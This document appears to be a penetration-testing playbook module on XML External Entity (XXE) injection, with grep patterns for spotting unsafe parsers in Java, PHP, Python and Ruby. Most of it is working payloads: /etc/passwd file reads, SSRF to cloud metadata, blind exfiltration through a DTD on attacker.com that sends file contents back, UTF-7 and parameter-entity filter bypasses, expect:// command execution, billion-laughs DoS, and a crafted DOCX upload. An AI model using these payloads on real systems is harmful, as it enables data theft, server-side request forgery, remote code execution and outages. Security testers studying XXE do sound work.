# VULN MODULE — XML External Entity (XXE)
# Asset: webapp
# CWE-611 | Report prefix: WEB-XXE

## THREAT MODEL

XXE exploits XML parsers that process external entity references.
Impact: local file read, SSRF, RCE (via expect://), DoS (billion laughs).

Injection points: any endpoint accepting XML, DOCX/XLSX/SVG/RSS uploads,
SOAP web services, XML-formatted API bodies.

## WHITEBOX PATTERNS

```bash
# Parser configuration (safe vs unsafe)
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory" --include="*.java" -A10
# Look for: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
# Missing = vulnerable

grep -rn "simplexml_load\|DOMDocument\|XMLReader\|xml_parse" --include="*.php" -A5
# Look for: libxml_disable_entity_loader(true)  — PHP < 8.0
# Missing = vulnerable
# Also flag: LIBXML_NOENT (enables entity substitution) and LIBXML_DTDLOAD (auto-loads external DTDs)
grep -rn "LIBXML_NOENT\|LIBXML_DTDLOAD\|LIBXML_DTDATTR" --include="*.php"
# Either flag present = parser is vulnerable to XXE

grep -rn "lxml\|ElementTree\|xml\.etree\|defusedxml" --include="*.py"
# lxml and ElementTree are vulnerable by default
# defusedxml = safe

grep -rn "nokogiri\|REXML\|LibXML" --include="*.rb"
```

## PAYLOADS

### Classic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

### Blind XXE via DNS — OOB exfiltration
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://UNIQUE.burpcollaborator.net/">]>
<root><data>&xxe;</data></root>
```

### Blind XXE — file exfiltration via OOB HTTP
```xml
<!-- Payload sent to server: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root/>

<!-- evil.dtd hosted on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

### External DTD to bypass `file://` filter
When the server filters `file://` in the direct payload, host the DTD externally.
The `file://` reference moves to your server — server fetches the DTD, DTD reads the file
and exfiltrates it via HTTP callback:

```xml
<!-- Payload sent to server (no file:// here): -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % xxe SYSTEM "https://attacker.com/xxe.dtd"> %xxe;
]>
<data><post><post_title>test</post_title></post></data>
```

```xml
<!-- xxe.dtd hosted on attacker.com: -->
<!ENTITY % hostname SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://attacker.com/?c=%hostname;'>">
%e;
%xxe;
```

### Parameter entities to bypass `&` filter
When regular entity syntax (`&name;`) is blocked, use parameter entities
(`%name;` — usable only within DTD context):

```xml
<!-- Instead of: <!ENTITY xxe SYSTEM "..."> ... &xxe; -->
<!-- Use: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;
]>
<root></root>
```

### UTF-7 encoding bypass
If XML keyword/symbol filters are in place, encode the entire payload in UTF-7.
The parser accepts the alternate encoding and processes the entities normally:

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+ACY-xxe+ADs-+ADw-/data+AD4-
```
Always include the XML prolog with `encoding="UTF-7"`.

### PHP wrapper escalation
```xml
<!-- RCE via expect:// (requires PHP Expect module) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY exec SYSTEM "expect://id">]>
<data>&exec;</data>

<!-- Read PHP source as base64 (php://filter) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<data>&xxe;</data>

<!-- PHAR archive read (also triggers insecure deserialization) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">]>
<data>&xxe;</data>
```

Other wrappers to try: `gopher://`, `ftp://`, `dict://`, `data://`, `zip://`

### XInclude (when you can't control DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG XXE (via file upload)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### Billion laughs DoS
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
<!-- Expands to ~1 billion "lol" strings = memory exhaustion -->
```

## TESTING NON-XML ENDPOINTS

### JSON endpoint with XML parser
```bash
# Change Content-Type to text/xml and send XML body
curl -s -X POST https://target.com/api/data \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### DOCX/XLSX/PPTX upload
```bash
# Extract and modify word/document.xml (for DOCX)
mkdir /tmp/xxe-docx
cp original.docx /tmp/xxe-docx/
cd /tmp/xxe-docx && unzip original.docx
# Edit word/document.xml: add XXE payload
zip -r malicious.docx .
```

## SECOND-ORDER XXE

The payload is **stored** at the injection point and **executed later** by a background
worker or async job — making it harder to detect than direct XXE.

Pattern:
1. Attacker submits malicious XML via import/upload feature → stored without immediate parsing
2. Background worker retrieves and parses the stored XML (the vulnerable component)
3. XXE fires out-of-band (blind) — monitor OAST server for callbacks

Detection approach: track all XML data flows throughout the app, including async/queued
processing. Use OAST (Burp Collaborator / interactsh) rather than direct response reading.
Test every XML import feature even if the immediate response shows no reflection.
